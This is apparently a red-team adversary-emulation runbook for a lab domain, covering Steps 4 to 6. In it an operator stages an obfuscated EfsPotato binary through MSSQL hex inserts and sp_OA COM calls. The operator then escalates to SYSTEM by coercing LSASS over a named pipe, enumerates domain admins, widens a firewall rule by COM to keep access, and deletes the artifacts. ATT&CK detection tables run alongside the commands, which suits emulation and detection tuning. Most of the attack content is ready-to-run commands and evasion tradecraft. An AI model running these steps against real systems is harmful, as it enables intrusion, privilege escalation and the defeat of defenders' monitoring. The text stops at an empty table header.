## Step 4 - Payload Staging and Privilege Escalation: MSSQL DB-Channel Transfer and EFS Named-Pipe Impersonation

### Voice Track

With the MSSQL execution channel established, the adversary stages the privilege escalation tool to IIS01 entirely through the database - no HTTP from IIS01, no WinRM, no lateral file copy. The controlServer hex-encodes `CertEnrollSvc.exe` (an obfuscated EfsPotato variant) and generates a T-SQL INSERT script that chunks the hex string as NVARCHAR rows. The TONESHELL implant on WS01 receives the SQL file via the C2 file-push channel - staged on disk as `stage_<id>.stl`, a benign 3D-model extension the `sqlcmd -i` invocation accepts directly - then sqlcmd bulk-inserts the hex chunks into a staging table in `tempdb`. A T-SQL batch on IIS01 concatenates the hex rows, converts the hex string to binary via `CONVERT(VARBINARY(MAX), @hex, 2)`, and writes the result to `C:\ProgramData\` through `sp_OA ADODB.Stream SaveToFile` - masquerading the payload as `CertEnrollSvc.stl` at rest, then renaming it to the original `CertEnrollSvc.exe` via `sp_OA Scripting.FileSystemObject MoveFile` in the same batch. Decode, write, and rename execute entirely in-process within `sqlservr.exe` with no PowerShell or `cmd.exe` spawn on IIS01. The staging table is then dropped and the SQL file deleted, leaving no intermediary artifact.

With the binary on disk, the adversary invokes `CertEnrollSvc.exe` directly via `xprun` (sp_OA `WScript.Shell.Run` → `ShellExecuteEx`) - the process chain is `sqlservr.exe → CertEnrollSvc.exe` with no intermediate `cmd.exe`, bypassing both xpagent and xp_cmdshell. The tool runs as the MSSQL service account (`NT SERVICE\MSSQL$SQLEXPRESS`), which holds `SeImpersonatePrivilege`. It creates an attacker-controlled named pipe and coerces LSASS to connect by triggering `EfsRpcEncryptFileSrv` via the MS-EFSR interface at `\\localhost\pipe\{guid}...`. When LSASS connects, the tool captures the SYSTEM impersonation token via `FSCTL_PIPE_IMPERSONATE` and `NtOpenThreadToken`, duplicates it to a primary token via `NtDuplicateToken`, and spawns `cmd.exe` as `NT AUTHORITY\SYSTEM` via `CreateProcessWithTokenW`. The spawned command (`whoami /priv`) is redirected to a staging file in `C:\ProgramData\`, which is read back via `xpfile cat` (`OPENROWSET BULK` - native T-SQL, no cmd.exe spawn). Because the output file is created under `NT AUTHORITY\SYSTEM` ownership, the MSSQL service account cannot delete it directly - cleanup requires a second `xprun` CertEnrollSvc.exe escalation to `del /f` the file under SYSTEM context.

### Procedures

**A - Stage CertEnrollSvc.exe to IIS01 via MSSQL database channel**

1. ☣️ Stage `CertEnrollSvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):

   ```
   xpstage-hex CertEnrollSvc.exe
   ```

   This performs the following automatically:
   - controlServer hex-encodes `CertEnrollSvc.exe`, generates INSERT SQL file with hex NVARCHAR rows
   - SQL file transferred to `C:\Windows\Temp\` on WS01 as `stage_<id>.stl` (masquerade) via TONESHELL FILE_DOWNLOAD
   - WS01 runs `sqlcmd -i C:\Windows\Temp\stage_<id>.stl` to bulk-INSERT hex chunks into `tempdb..stg` on IIS01
   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` → `sp_OA ADODB.Stream SaveToFile` writes `CertEnrollSvc.stl` to `C:\ProgramData\` + `sp_OA FSO MoveFile` renames it to `CertEnrollSvc.exe` in the same batch - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
   - SQL file deleted from WS01; `tempdb..stg` dropped

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\CertEnrollSvc.exe
     ```

2. Verify the binary landed on IIS01:

   ```
   xpfile exists C:\ProgramData\CertEnrollSvc.exe
   ```

   - ***Expected Output***
     ```text
     File Exists  Directory Exists  Parent Directory Exists
     ----------- --------------- ----------------------
               1               0                       1
     ```

**B - Verify EFS service and escalate to SYSTEM**

3. Verify EFSSVC is running (prerequisite - EFS named-pipe coercion requires the EFS service):

   ```
   xpexec sc query EFS
   ```

   - ***Expected Output***
     ```text
     STATE              : 4  RUNNING
     ```

   > If stopped: `xpexec sc start EFS` then re-verify.

4. ☣️ Execute EfsPotato privilege escalation:

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc
   ```

   `xprun` executes CertEnrollSvc.exe directly via sp_OA `WScript.Shell.Run` (ShellExecuteEx) - `sqlservr.exe` spawns `CertEnrollSvc.exe` with no intermediate `cmd.exe`. Unlike `xpexec`, this bypasses xpagent and xp_cmdshell entirely.
   - `lsarpc` selects the EFS RPC endpoint (`args[1]`)

5. Read escalation output to confirm SYSTEM privilege:

   ```
   xpfile cat C:\ProgramData\sys_out.txt
   ```

   - ***Expected Output***
     ```text
     PRIVILEGES INFORMATION
     ----------------------

     Privilege Name                            Description                                                        State
     ========================================= ================================================================== =======
     SeCreateTokenPrivilege                    Create a token object                                              Enabled
     SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
     SeTcbPrivilege                            Act as part of the operating system                                Enabled
     SeDebugPrivilege                          Debug programs                                                     Enabled
     SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
     ...
     ```

     > Full SYSTEM token - `SeDebugPrivilege`, `SeTcbPrivilege`, `SeCreateTokenPrivilege` all Enabled confirms `NT AUTHORITY\SYSTEM` context.

6. ☣️ Delete the escalation output file (requires SYSTEM - file is owned by NT AUTHORITY\SYSTEM):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\sys_out.txt" lsarpc
   ```

   > `xpfile del` (sp_OA FileSystemObject) returns `0x800A0046` Permission Denied on SYSTEM-owned files. A second EfsPotato escalation deletes the file under SYSTEM context.

   - ***Expected Output***
     ```text
     exit_code
     -----------
               0
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| TONESHELL FILE_DOWNLOAD transfers hex INSERT SQL staging file to C:\Windows\Temp\ on WS01 as stage_<id>.stl | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new file matching `C:\Windows\Temp\stage_*.stl` to `C:\Windows\Temp\` - a signed Microsoft binary acting as a C2 implant depositing an inbound payload to the system temp directory under a benign stereolithography 3D-model extension, with no established baseline for file-write activity from this process; content inspection of the on-disk file shows SQL INSERT text under the `.stl` extension | Not Calibrated - Not Benign | transport | TONESHELL implant receives `FILE_DOWNLOAD` (id=3) task and writes hex-encoded INSERT SQL file as `stage_<id>.stl` (masquerade) to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| sqlcmd.exe on WS01 bulk-INSERTs hex payload chunks into tempdb..stg on IIS01 via MSSQL channel | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `sqlcmd.exe` spawned by `EssosUpdate.exe` on WS01 executes with `-i C:\Windows\Temp\stage_*.stl` against `10.12.10.20:1433` - a non-DBA, non-app-tier process bulk-inserting a file staged as a 3D-model document into IIS01 MSSQL via the database channel has no established baseline on this developer workstation | Calibrated - Not Benign | - | TONESHELL spawns `sqlcmd -i C:\Windows\Temp\stage_<id>.stl` on WS01 to bulk-INSERT hex-encoded payload chunks into `tempdb..stg` on IIS01 - database used as covert staging channel, no file written to IIS01 disk | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/toneshell_shell.py) | - |
| WS01 implant spawns sqlcmd T-SQL batch CONVERT(VARBINARY,'0x'+@hex,1) hex-decodes tempdb..stg rows to raw binary on IIS01 | Stealth | T1140 | Deobfuscate/Decode Files or Information | Windows | N/A - C3: hex decode via T-SQL CONVERT(VARBINARY(MAX), '0x'+@hex, 2) executes entirely in-process within sqlservr.exe on IIS01 - no process creation, file write, registry, or network artifact from the decode step itself; the resulting binary write to disk is covered by the T1559.001 ADODB.Stream row | Not Calibrated - Not Benign | out-of-surface | T-SQL batch on IIS01: `SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX)) FROM tempdb..stg` concatenates hex rows, then `CONVERT(VARBINARY(MAX),'0x'+@hex,1)` decodes hex string to raw binary - entirely in-process within `sqlservr.exe`; no PowerShell or cmd.exe spawn; decode and COM write execute in the same T-SQL batch | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| sp_OA ADODB.Stream hex-decodes tempdb..stg rows and writes CertEnrollSvc.stl binary to C:\ProgramData\ on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` creates `CertEnrollSvc.stl` in `C:\ProgramData\` on IIS01 via COM automation (`ADODB.Stream`) - MSSQL service has no baseline for writing PE binaries to the system data directory via OLE Automation, least of all under a benign 3D-model extension (content inspection shows an MZ header under the `.stl` extension); no PowerShell or `cmd.exe` spawn on IIS01 (xpstage-hex is entirely in-process); Sysmon EC=11 on `CertEnrollSvc.stl` with creator `sqlservr.exe` | Calibrated - Not Benign | - | WS01 sqlcmd invokes T-SQL batch on IIS01: concatenates hex rows from `tempdb..stg` → `CONVERT(VARBINARY(MAX),@hex,2)` → `sp_OACreate 'ADODB.Stream'` + `sp_OASetProperty Type 1` + `sp_OAMethod Write` + `sp_OAMethod SaveToFile C:\ProgramData\CertEnrollSvc.stl 2` - entire hex decode and binary write in-process within `sqlservr.exe`, payload at rest under masquerading extension | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| T-SQL batch renames staged CertEnrollSvc.stl to CertEnrollSvc.exe via sp_OA FSO MoveFile on IIS01 | Stealth | T1036.008 | Masquerading: Masquerade File Type | Windows | `sqlservr.exe` on IIS01 renames `C:\ProgramData\CertEnrollSvc.stl` to `CertEnrollSvc.exe` via COM automation (`sp_OACreate 'Scripting.FileSystemObject'` + `sp_OAMethod MoveFile`) in the same decode batch - MSSQL service has no baseline for performing file renames via OLE Automation, and the rename targets a `.stl` file whose content is a PE binary (MZ header) written by the same process moments earlier; file-rename telemetry (mini-filter/USN) attributes the rename to `sqlservr.exe`, with no corresponding shell or Explorer rename in the process tree | Calibrated - Not Benign | - | T-SQL decode batch on IIS01 continues after `SaveToFile`: `sp_OACreate 'Scripting.FileSystemObject'` + `sp_OAMethod MoveFile C:\ProgramData\CertEnrollSvc.stl C:\ProgramData\CertEnrollSvc.exe` - masquerade ends in the same in-process batch, before `xprun` execution | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
| hex INSERT SQL file deleted from C:\Windows\Temp\ on WS01 and tempdb..stg dropped on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` spawns `cmd.exe /c del /f` to delete the hex INSERT SQL staging file `C:\Windows\Temp\stage_<id>.stl` from `C:\Windows\Temp\` on WS01 - TONESHELL implant removing the staging artifact post-transfer; IIS01-side `DROP TABLE tempdb..stg` is N/A - C3 (internal MSSQL T-SQL operation, off EDR surface) | Not Calibrated - Not Benign | staging | WS01 deletes hex INSERT SQL file `stage_<id>.stl` via `cmd /c del /f`; WS01 sqlcmd issues `DROP TABLE tempdb..stg` on IIS01 - staging artifacts cleared | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | - | - |
| sp_OA WScript.Shell.Run dispatches CertEnrollSvc.exe directly on IIS01 (no cmd.exe) | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` on IIS01 spawns `CertEnrollSvc.exe` via OLE Automation (`sp_OACreate 'WScript.Shell'` + `sp_OAMethod Run`) - `sqlservr.exe` is the direct parent of `CertEnrollSvc.exe` with no intermediate `cmd.exe`; COM-based process creation from MSSQL service has no baseline on this IIS01 instance | Calibrated - Not Benign | - | `xprun` dispatches CertEnrollSvc.exe via sp_OA `WScript.Shell.Run` (ShellExecuteEx) - bypasses xpagent and xp_cmdshell; `sqlservr.exe` directly spawns `CertEnrollSvc.exe` on IIS01 with no `cmd.exe` in the chain | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe resolves sensitive Win32 APIs at runtime via GetProcAddress on IIS01; only GetModuleHandleW and GetProcAddress appear in static IAT | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollSvc.exe` (in `C:\ProgramData\`, child of `sqlservr.exe`) has a sparse static import table containing only `GetModuleHandleW` and `GetProcAddress` while at runtime calling `LoadLibraryW` to load `advapi32.dll` and `Rpcrt4.dll` and resolving sensitive token-theft and pipe APIs via `GetProcAddress` - YARA/capability signature on the PE file flags sparse-IAT binary in `C:\ProgramData\`; in-memory capability scan flags `GetProcAddress` resolving `NtOpenThreadToken`, `NtDuplicateToken`, `CreateNamedPipeW`, and `EfsRpcEncryptFileSrv` at runtime | Calibrated - Not Benign | - | CertEnrollSvc.exe loads advapi32 and Rpcrt4 via LoadLibraryW and resolves NtFsControlFile, NtOpenThreadToken, NtDuplicateToken, CreateNamedPipeW, CreateProcessWithTokenW, and EfsRpcEncryptFileSrv via GetProcAddress; no sensitive API names appear in the PE import table | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe allocates VirtualAlloc private page flipped to PAGE_EXECUTE_READ via VirtualProtect writing NtFsControlFile/NtOpenThreadToken/NtDuplicateToken indirect syscall trampolines on IIS01 | Stealth | T1620 | Reflective Code Loading | Windows | `CertEnrollSvc.exe` process on IIS01 contains a private executable memory region (VAD entry: MEM_PRIVATE, EXECUTE_READ, no file backing) created via `VirtualAlloc(PAGE_READWRITE)` + `VirtualProtect(PAGE_EXECUTE_READ)` - memory scanning flags a no-file-backing executable page in a process spawned from `sqlservr.exe`; RWX-lifecycle private allocation (write then flip to execute) detectable via ETW VirtualAlloc/VirtualProtect telemetry from a process with no established baseline for private code allocation | Calibrated - Not Benign | - | CertEnrollSvc.exe: `VirtualAlloc(PAGE_READWRITE)` allocates a private page, writes indirect syscall stubs for NtFsControlFile, NtOpenThreadToken, NtDuplicateToken, then `VirtualProtect(PAGE_EXECUTE_READ)` marks executable - VAD entry shows MEM_PRIVATE EXECUTE_READ with no file backing; token theft chain dispatched via these trampolines, bypassing advapi32 hook points | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe EfsPotato named-pipe impersonation: creates attacker pipe → coerces LSASS via EfsRpcEncryptFileSrv → captures and duplicates SYSTEM token | Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) creates a named pipe with GUID-format name (`\\.\pipe\{guid}`) and subsequently calls `NtOpenThreadToken` + `NtDuplicateToken` - named pipe impersonation sequence by a non-SYSTEM service binary in `C:\ProgramData\` on IIS01, detectable via file I/O pipe-creation event and native API monitoring kernel callbacks | Calibrated - Not Benign | - | `CertEnrollSvc.exe` executes the full EfsPotato chain: **(1)** creates a named pipe at `\\.\pipe\{guid}` (file I/O telemetry - pipe creation by a non-SYSTEM service process); **(2)** issues `EfsRpcEncryptFileSrv` RPC call targeting the `lsarpc` named pipe to force LSASS to connect to the attacker pipe (RPC/ETW telemetry - EFSSVC must be running); **(3)** calls `FSCTL_PIPE_IMPERSONATE` on the pipe handle, retrieves the SYSTEM impersonation token via `NtOpenThreadToken`, and duplicates it to a primary token via `NtDuplicateToken` (native API monitoring - kernel callback for token duplication sequence) | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe executes FSCTL_PIPE_IMPERSONATE, NtOpenThreadToken, NtDuplicateToken via indirect syscall trampolines bypassing advapi32 hook entry points on IIS01 | Stealth | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` on IIS01 issues `NtFsControlFile` (FSCTL_PIPE_IMPERSONATE code), `NtOpenThreadToken`, and `NtDuplicateToken` via syscall stubs executing from a private EXECUTE_READ (no-file-backing) memory allocation - native API monitoring (kernel callback) observes the syscall return address pointing into the MEM_PRIVATE region rather than `ntdll.dll`, indicating direct-syscall dispatch; `advapi32.dll` hook entry points (`ImpersonateNamedPipeClient`, `DuplicateTokenEx`) are not invoked | Calibrated - Not Benign | - | Token capture and duplication chain executed via VirtualAlloc trampoline page - not advapi32 ImpersonateNamedPipeClient: NtFsControlFile (FSCTL_PIPE_IMPERSONATE) → NtOpenThreadToken → NtDuplicateToken invoked directly via syscall stubs; advapi32 hook intercept points bypassed on x64 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe CreateProcessWithTokenW spawns cmd.exe as NT AUTHORITY\SYSTEM | Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `cmd.exe` spawned by `CertEnrollSvc.exe` on IIS01 runs as `NT AUTHORITY\SYSTEM` while parent executes as `NT SERVICE\MSSQL$SQLEXPRESS` - parent/child token privilege mismatch visible in process creation telemetry via `CreateProcessWithTokenW` | Calibrated - Not Benign | - | `CertEnrollSvc.exe` calls `CreateProcessWithTokenW` with the duplicated SYSTEM primary token to spawn `cmd.exe /c whoami /priv > C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| CertEnrollSvc.exe CreateProcessWithTokenW spawns SYSTEM cmd.exe on IIS01 | Execution | T1106 | Native API | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) invokes the Windows API `CreateProcessWithTokenW` - resolved at runtime via `GetProcAddress` rather than statically imported - to create `cmd.exe` under the duplicated SYSTEM token on IIS01 - native API monitoring (kernel process-creation callback) observes a CreateProcess-family call emitted by a process whose import table does not reference it, and the spawned child runs as `NT AUTHORITY\SYSTEM` while the parent remains a service SID; baseline: no service, tool, or scheduled task on IIS01 creates processes via `CreateProcessWithTokenW` | Calibrated - Not Benign | - | CertEnrollSvc.exe calls CreateProcessWithTokenW (resolved at runtime) to spawn cmd.exe under the duplicated SYSTEM primary token - native process-creation primitive; representative of all EfsPotato SYSTEM spawns in Phase 2 (whoami /priv, cleanup deletions, FwPolicySvc launch) | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
| SYSTEM cmd.exe runs whoami /priv to confirm full privilege token on IIS01 | Discovery | T1033 | System Owner/User Discovery | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, child of `CertEnrollSvc.exe`) spawns `whoami.exe` with `/priv` argument on IIS01, redirecting output to `C:\ProgramData\sys_out.txt` - SYSTEM-context privilege enumeration following token theft | Not Calibrated - Not Benign | native-recon | `cmd.exe` running as `NT AUTHORITY\SYSTEM` executes `whoami /priv` and redirects output to `C:\ProgramData\sys_out.txt` - verifies that the duplicated token carries full SYSTEM privileges | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| OPENROWSET BULK reads SYSTEM whoami output from C:\ProgramData\sys_out.txt on IIS01 | Collection | T1005 | Data from Local System | Windows | `sqlservr.exe` on IIS01 opens `C:\ProgramData\sys_out.txt` for read access via `OPENROWSET(BULK ... SINGLE_CLOB)` - EDR file-read telemetry: sqlservr.exe reading non-database `.txt` from `C:\ProgramData\` has no baseline on this IIS01 instance; native T-SQL operation, no COM automation or cmd.exe spawn | Calibrated - Not Benign | - | `xpfile cat C:\ProgramData\sys_out.txt` - `OPENROWSET(BULK ... SINGLE_CLOB)` reads entire file as `NVARCHAR(MAX)` in-process within `sqlservr.exe`; output returned as SELECT result to operator via C2 - no cmd.exe spawn on IIS01 | IIS01 (10.12.10.20) | sa | - | - |
| CertEnrollSvc.exe SYSTEM escalation deletes sys_out.txt from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` - same escalation chain as T1134.001/T1134.002 rows but for cleanup; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\sys_out.txt" lsarpc` - second EfsPotato escalation required because `sys_out.txt` is owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token → `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |

---

## Step 5 - Discovery: Domain Groups and Accounts

### Voice Track

With SYSTEM confirmed on IIS01 and the xpagent channel operational, the adversary pivots to domain reconnaissance. Rather than staging a batch script and spending another EfsPotato named-pipe coercion on a non-escalation goal, the adversary dispatches the four Net queries directly through the xpagent channel - each command inserted into `xpagent.dbo.cmd`, executed by the `agent_worker` activation procedure as `NT SERVICE\MSSQL$SQLEXPRESS`, and output returned inline without writing a file to disk. The MSSQL service account presents as the machine account `IIS01$` to the domain controller - the same Kerberos identity SYSTEM would carry for AD-bound calls - and the Net utility queries return identical results at both privilege levels. The adversary maps testlab.local's group and account structure, locating Domain Admins membership and user accounts that will serve as targets for credential attacks in later phases.

### Procedures

1. Enumerate all domain groups:

   ```
   xpexec net group /domain
   ```

   - ***Expected Output***
     ```text
     The request will be processed at a domain controller for domain testlab.local.

     Aliases in domain testlab.local
     Domain Admins
     Domain Computers
     Domain Controllers
     ...
     ```

2. Query Domain Admins group membership:

   ```
   xpexec net group "Domain Admins" /domain
   ```

   - ***Expected Output***
     ```text
     Group name     Domain Admins
     Comment        Designated administrators of the domain
     Members
     ---------------------------------------------------------------------------
     administrator
     ...
     ```

   > `System error 5 - Access is denied` is an acceptable outcome - the attempted query is still a valid observable.

3. Enumerate domain user accounts:

   ```
   xpexec net user /domain
   ```

   - ***Expected Output***
     ```text
     User accounts for \\testlab.local

     -------------------------------------------------------------------------------
     Administrator              Guest                      krbtgt
     labuser                    svc_app_dev                ...
     ```

4. Query administrator account details:

   ```
   xpexec net user administrator /domain
   ```

   - ***Expected Output***
     ```text
     User name                    Administrator
     Full Name
     Comment                      Built-in account for administering the computer/domain
     ...
     Global Group memberships     *Domain Users         *Domain Admins
     The command completed successfully.
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| agent_worker activation proc invokes xp_cmdshell running net group /domain on IIS01 | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `net.exe group /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe → cmd.exe → net.exe` - the MSSQL service account has no baseline for issuing domain group discovery commands via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` procedure calls `xp_cmdshell 'net group /domain'`; `sqlservr.exe` spawns `cmd.exe` → `net.exe` as `NT SERVICE\MSSQL$SQLEXPRESS`; `IIS01$` machine account authenticates to DC via SAM-R; output rows returned inline via xpagent poll | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |
| agent_worker activation proc invokes xp_cmdshell running net user /domain on IIS01 | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `net.exe user /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe → cmd.exe → net.exe` - the MSSQL service account has no baseline for domain user enumeration via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` calls `xp_cmdshell 'net user /domain'`; `net.exe` enumerates all domain user accounts via SAM-R to DC as `IIS01$` | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |

---

## Step 6 - Defense Impairment: Windows Defender Firewall Rule Modification via INetFwPolicy2 COM

### Voice Track

With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary moves to protect the access it now depends on. The MSSQL listener rule on IIS01 was created scoped to the Domain firewall profile only, which means any profile change on the host - or the adapter being reclassified - silently severs the database channel every later phase relies on. Rather than accept that fragility, the adversary widens the rule so the listener is reachable regardless of the host's current firewall profile. The obvious tools for this, `netsh advfirewall` and the `NetFirewallRule` PowerShell cmdlets, are exactly what mature detections key on, so the adversary instead stages a purpose-built binary through the same MSSQL database channel used in Step 4. `FwPolicySvc` instantiates the Windows Firewall policy COM objects (`HNetCfg.FwPolicy2` and `HNetCfg.FwRule`) in-process and rewrites the rule's `Profiles` mask directly - `netsh.exe` and `powershell.exe` never appear in the process tree, and no command line ever names a firewall cmdlet. Execution is dispatched through the EFS named-pipe SYSTEM chain from Step 4, so the COM call lands with the elevation the firewall policy store requires. The rule is widened, the change confirmed, and the tool and its output removed from disk in the same step.

### Procedures

**A - Stage FwPolicySvc.exe to IIS01 via MSSQL database channel**

1. ☣️ Stage `FwPolicySvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):

   ```
   xpstage-hex FwPolicySvc.exe
   ```

   This performs the following automatically:
   - controlServer hex-encodes `FwPolicySvc.exe`, generates INSERT SQL file with hex NVARCHAR rows
   - SQL file transferred to `C:\Windows\Temp\` on WS01 as `stage_<id>.stl` (masquerade) via TONESHELL FILE_DOWNLOAD
   - WS01 runs `sqlcmd -i C:\Windows\Temp\stage_<id>.stl` to bulk-INSERT hex chunks into `tempdb..stg` on IIS01
   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` → `sp_OA ADODB.Stream SaveToFile` writes `FwPolicySvc.stl` to `C:\ProgramData\` + `sp_OA FSO MoveFile` renames it to `FwPolicySvc.exe` in the same batch - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
   - SQL file deleted from WS01; `tempdb..stg` dropped

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\FwPolicySvc.exe
     ```

2. Verify the binary landed on IIS01:

   ```
   xpfile exists C:\ProgramData\FwPolicySvc.exe
   ```

   - ***Expected Output***
     ```text
     File Exists  Directory Exists  Parent Directory Exists
     ----------- --------------- ----------------------
               1               0                       1
     ```

**B - Widen the MSSQL rule to all firewall profiles as SYSTEM**

3. ☣️ Execute `FwPolicySvc.exe setprofiles` as SYSTEM through the EFS named-pipe chain, redirecting its output to a staging file for readback (output of the SYSTEM child is not returned inline):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe setprofiles \"SQL Server (TCP 1433)\" all > C:\ProgramData\fwp_out.txt 2>&1" lsarpc
   ```

   `xprun` executes `CertEnrollSvc.exe` directly via sp_OA `WScript.Shell.Run` (ShellExecuteEx) with no intermediate `cmd.exe`; `CertEnrollSvc.exe` performs the EfsPotato coercion, obtains a SYSTEM token, and spawns the inner command as `NT AUTHORITY\SYSTEM`. `cmd.exe` appears only as the stdout-redirection wrapper - it is not the mechanism that modifies the firewall rule. The firewall change itself is made in-process by `FwPolicySvc.exe` via `INetFwPolicy2` / `INetFwRules`: it resolves the existing `SQL Server (TCP 1433)` rule and sets `INetFwRule.Profiles` to `0x7FFFFFFF` (Domain + Private + Public).
   - `lsarpc` selects the EFS RPC endpoint (`args[1]`)

4. Read back the tool output to confirm the profile mask was rewritten:

   ```
   xpfile cat C:\ProgramData\fwp_out.txt
   ```

   - ***Expected Output***
     ```text
     [+] rule 'SQL Server (TCP 1433)' profiles set to all (0x7FFFFFFF)
     ```

   > Optional independent confirmation through the same SYSTEM chain - the widened mask is also visible in the firewall policy store:
   > ```
   > xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe show \"SQL Server (TCP 1433)\" >> C:\ProgramData\fwp_out.txt 2>&1" lsarpc
   > ```
   > → `profiles=all (0x7FFFFFFF)`

**C - Cleanup**

5. ☣️ Delete the output file and the tool (both owned by NT AUTHORITY\SYSTEM):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe" lsarpc
   ```

   > `xpfile del` (sp_OA FileSystemObject) returns `0x800A0046` Permission Denied on SYSTEM-owned files. The deletion therefore runs under the same SYSTEM chain used to create them.

   - ***Expected Output***
     ```text
     exit_code
     -----------
               0
     ```

### Reference Tables

<!-- xpstage-hex mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT hex → T-SQL ADODB.Stream decode → cleanup) are identical to Step 4 and are not re-scored here. -->

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
